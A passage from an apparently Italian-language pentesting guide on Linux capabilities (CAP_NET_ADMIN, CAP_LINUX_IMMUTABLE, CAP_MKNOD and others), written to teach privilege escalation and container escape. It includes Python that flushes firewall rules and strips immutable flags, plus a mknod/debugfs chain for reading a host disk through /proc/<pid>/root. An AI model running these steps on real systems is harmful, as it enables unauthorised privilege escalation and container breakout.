Queste operazioni hanno effetto sul **network namespace corrente** del processo. Il controllo dello stato di rete dell'host richiede `--network=host`, Kubernetes `hostNetwork: true` o una primitiva separata per l'accesso al namespace. `CAP_NET_RAW` da sola non è una shell generica sull'host, ma ha partecipato a una escape documentata e specifica per protocollo: una catena storica di GCE combinava root, il network namespace dell'host, `CAP_NET_ADMIN`, `CAP_NET_RAW`, traffico metadata in plaintext e una richiesta raceable al guest-agent per iniettare una chiave SSH. Consulta [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) per i prerequisiti completi e le moderne limitazioni dei metadata HTTPS.

**Esempio con binary**

Supponiamo che il **python binary** disponga di queste capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Questa capability consente di modificare i flag degli inode, come immutable e append-only.** Non garantisce direttamente ulteriori privilege escalation.<sup>[[14]](#references)</sup>

**Esempio con binary**

Se trovi che un file è immutable e python dispone di questa capability, puoi **rimuovere l'attributo immutable e rendere il file modificabile:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Le operazioni `FS_IOC_GETFLAGS` e `FS_IOC_SETFLAGS` leggono e aggiornano i flag dell'inode; `FS_IMMUTABLE_FL` è il flag immutable che viene rimosso da questo esempio.<sup>[[27]](#references)</sup>

> [!TIP]
> Nota che normalmente questo attributo immutable viene impostato e rimosso usando:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente l'esecuzione della system call `chroot(2)`, che può permettere l'escape da un jail `chroot(2)` configurato in modo debole tramite tecniche note.<sup>[[11]](#references)[[14]](#references)</sup>

Questa è una **capability per l'escape da un chroot jail, non un escape autonomo da un container all'host**. Non espone il filesystem dell'host né aggira i suoi permessi. Se la root dell'host è già montata o raggiungibile tramite `/proc/<pid>/root`, `chroot()` rende semplicemente quell'albero la root dei pathname del processo. Separatamente, la modifica dei mount namespace con `setns(2)` richiede sia `CAP_SYS_CHROOT` sia `CAP_SYS_ADMIN` nel user namespace del chiamante, oltre a `CAP_SYS_ADMIN` nel user namespace proprietario del mount namespace target.<sup>[[14]](#references)</sup>

- [Come uscire da varie soluzioni chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: tool per l'escape da chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente l'esecuzione della system call `reboot(2)` per i riavvii del sistema, inclusi comandi come `LINUX_REBOOT_CMD_RESTART2`; abilita inoltre `kexec_load(2)` e, a partire da Linux 3.17, `kexec_file_load(2)` per caricare rispettivamente nuovi crash kernel o crash kernel firmati.<sup>[[14]](#references)</sup>

All'interno di un PID namespace privato, una richiesta `reboot()` supportata termina il processo init di quel namespace invece di riavviare l'host. Pertanto, l'impatto del riavvio dell'host richiede l'initial PID namespace, normalmente tramite la condivisione del PID dell'host. Un takeover basato su kexec richiede inoltre un'immagine compatibile, una syscall disponibile e policy permissive per il lockdown e le firme. Non attivare nessuna delle due operazioni su un host condiviso soltanto per convalidare la capability:
```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) è stato separato dal più ampio **CAP_SYS_ADMIN** in Linux 2.6.37, concedendo specificamente la possibilità di usare la chiamata `syslog(2)`. Questa capability consente di visualizzare gli indirizzi del kernel tramite `/proc` e interfacce simili quando l'impostazione `kptr_restrict` è pari a 1, controllando l'esposizione degli indirizzi del kernel. Da Linux 2.6.39, il valore predefinito di `kptr_restrict` è 0, il che significa che gli indirizzi del kernel sono esposti, sebbene molte distribuzioni lo impostino su 1 (nasconde gli indirizzi tranne che a uid 0) o 2 (nasconde sempre gli indirizzi) per motivi di sicurezza.<sup>[[14]](#references)</sup>

Inoltre, **CAP_SYSLOG** consente di accedere all'output di `dmesg` quando `dmesg_restrict` è impostato su 1. Nonostante queste modifiche, **CAP_SYS_ADMIN** conserva la possibilità di eseguire operazioni `syslog` per ragioni storiche.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) estende le funzionalità della system call `mknod` oltre la creazione di file normali, FIFO (named pipe) o socket di dominio UNIX. Consente specificamente la creazione di file speciali, tra cui:<sup>[[14]](#references)</sup>

- **S_IFCHR**: file speciali a caratteri, ovvero dispositivi come i terminali.
- **S_IFBLK**: file speciali a blocchi, ovvero dispositivi come i dischi.

Questa capability è utile per i processi che devono creare file di dispositivo, inclusi dispositivi a caratteri o a blocchi.<sup>[[14]](#references)</sup>

È inclusa nel set di capability predefinito documentato di Docker; verifica la configurazione effettiva del runtime invece di presumere che ogni deployment utilizzi gli stessi valori predefiniti ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Per un container escape, `CAP_MKNOD` può creare un handle mancante verso un dispositivo reale dell'host, ma **non** crea il dispositivo sottostante e **non** bypassa il device cgroup. La catena completa richiede:

1. `CAP_MKNOD` effettiva nel namespace utente iniziale, perché la creazione dei dispositivi non è namespaced.
2. Il tipo corretto a blocchi o a caratteri e i numeri major/minor di un dispositivo reale dell'host.
3. L'autorizzazione del device cgroup ad aprire quel dispositivo.
4. Un reader compatibile e consapevole del filesystem, oppure `CAP_SYS_ADMIN` per montare un filesystem a blocchi.
5. Le autorizzazioni del filesystem e dell'LSM per creare e utilizzare il nodo.

Per un dispositivo a blocchi di laboratorio appartenente alla famiglia ext, i cui numeri major/minor reali sono `252:1`, una validazione in sola lettura è:
```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Sostituisci i numeri con quelli riportati da `/sys/class/block/<device>/dev`. Se la creazione del nodo riesce ma l'apertura restituisce `Operation not permitted`, il device cgroup sta ancora bloccando l'accesso. Questo è il risultato normale in un container che dispone semplicemente del `CAP_MKNOD` predefinito di Docker, senza un'autorizzazione esplicita per il device.

Esiste anche una distinta tecnica di **local privilege-escalation a due foothold**, da non confondere con l'accesso diretto al device del container. Un processo root in un container che condivide il namespace utente iniziale può creare un nodo di block device, mentre una shell non privilegiata sull'host con un UID corrispondente apre quel nodo tramite `/proc/<container-pid>/root`. L'apertura viene quindi valutata nel cgroup della shell sull'host, perciò il diniego del device cgroup del container non protegge più il device.<sup>[[7]](#references)</sup>

All'interno del container, crea il nodo e mantieni in esecuzione un processo con l'UID del foothold esistente sull'host:
```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
useradd -u "$host_uid" -M htbridge
bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```
Dalla shell dell'host esistente con quell'UID, identifica il PID dell'host del processo del container in stato sleeping e usa la sua root procfs come percorso del device:
```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```
Questa catena richiede entrambi i foothold, uno user namespace con mappatura delle identità o condiviso, il permesso di attraversare `/proc/<pid>/root` del target, un dispositivo reale con i numeri major/minor corretti e un cgroup esterno che consenta l'apertura. `hidepid`, le regole di accesso ptrace, un LSM, l'incompatibilità del filesystem o il remapping dello user namespace possono interromperla. La tecnica storica è preziosa proprio perché spiega come `/proc/<pid>/root` possa aggirare la restrizione del device cgroup del *container*; non sostiene che il solo `CAP_MKNOD` permetta di evadere da un container normalmente isolato.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Sugli attuali kernel Linux con file capabilities, **`CAP_SETPCAP`** consente a un thread di aggiungere capabilities dal proprio bounding set al proprio inheritable set, rimuovere capabilities dal proprio bounding set e modificare i propri securebits. Non consente a un processo di assegnare arbitrariamente capabilities a un altro processo; questo comportamento si applica solo ai kernel precedenti alla versione 2.6.25 e privi del supporto alle file capabilities.<sup>[[14]](#references)</sup>

La system call `capset()` può modificare gli effective, permitted e inheritable set del thread stesso, ma il nuovo permitted set non può contenere capabilities esterne all'attuale permitted set e gli aggiornamenti dell'inheritable set restano soggetti ai vincoli del kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Laboratori di privilege escalation sulle Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation su Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Nozioni di base sui Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Sfruttare le Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Capabilities eccessive](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Abusare dell'accesso ai mount namespace tramite /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: perché esistono e come funzionano](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Comprendere le Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC per aggirare seccomp se ptrace è consentito](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Come evadere da varie soluzioni chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - exploit originale di breakout da Docker tramite CAP_DAC_READ_SEARCH, di Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analisi dell'exploit di breakout da Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Esecuzione dei container - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
